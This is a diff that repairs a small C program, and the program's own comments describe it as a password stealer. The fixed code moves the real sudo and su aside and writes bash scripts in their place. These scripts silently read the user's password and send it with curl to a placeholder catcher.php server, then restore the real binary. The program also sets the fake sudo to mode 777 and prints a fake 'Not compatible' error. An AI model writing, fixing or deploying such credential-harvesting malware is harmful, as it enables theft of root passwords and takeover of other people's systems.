@@ -21,11 +21,11 @@ int main () {
 
     /**  MOVES ORIGINAL SUDO (COPY)  **/
 	
-    system("sudo md /usr/bin/sudo /usr/sudo") 
+    system("sudo mv /usr/bin/sudo /usr/sudo");
 	    
     /**  MOVES ORIGINAL SU (COPY)  **/	   
 	    
-    system("sudo md /usr/bin/su /usr/su") 
+    system("sudo mv /usr/bin/su /usr/su");
 	    
     /** OVERWRITE /BIN/SU WITH POISONED BASH THAT STEPS THE PASSWORDS **/
 	    
@@ -33,7 +33,7 @@ int main () {
 	
     /** MALICIUS BASH, ASK FOR PASSWD, SEND TO SERVER, FIX SUDO  **/
    
-    char cmmd1[200] = "#!/bin/bash \n stty -echo \n printf \"Password: \" \n read PASSWORD \n stty echo \n echo \n curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" \n sudo mv /usr/su /usr/bin/su" > /dev/null 2>&1 \n";
+    char cmmd1[230] = "#!/bin/bash \n stty -echo \n printf \"Password: \" \n read PASSWORD \n stty echo \n echo \n curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" \n sudo mv /usr/su /usr/bin/su" > /dev/null 2>&1 \n";
     file1 = fopen("/bin/su", "w");
 
     if(file1 == NULL) {
@@ -53,7 +53,7 @@ int main () {
 	
    /** MALICIUS BASH, ASK FOR PASSWD, SEND TO SERVER, FIX SUDO  **/
 	
-   char cmmd2[200] = "#!/bin/bash \n stty -echo \n printf \"Password: \" \n read PASSWORD \n stty echo \n echo \n curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" \n sudo mv /usr/sudo /usr/bin/sudo > /dev/null 2>&1 \n"; 
+   char cmmd2[230] = "#!/bin/bash \n stty -echo \n printf \"Password: \" \n read PASSWORD \n stty echo \n echo \n curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" \n sudo mv /usr/sudo /usr/bin/sudo > /dev/null 2>&1 \n"; 
    file2 = fopen("/usr/bin/sudo", "w");
    if(file2 == NULL) {
         printf("Err.: Try executing me again...");
@@ -62,10 +62,12 @@ int main () {
         fclose(file2);
     }
 
-    /** GIVE 777 **/system("chmod 777 /usr/bin/sudo > /dev/null 2>&1");
+    /** GIVE 777 **/
 	
-    printf("Error: Not compatible")
-    printf("Exiting...")
+    system("chmod 777 /usr/bin/sudo > /dev/null 2>&1");
+	
+    printf("Error: Not compatible");
+    printf("Exiting...");
     return(0);
 } 
 
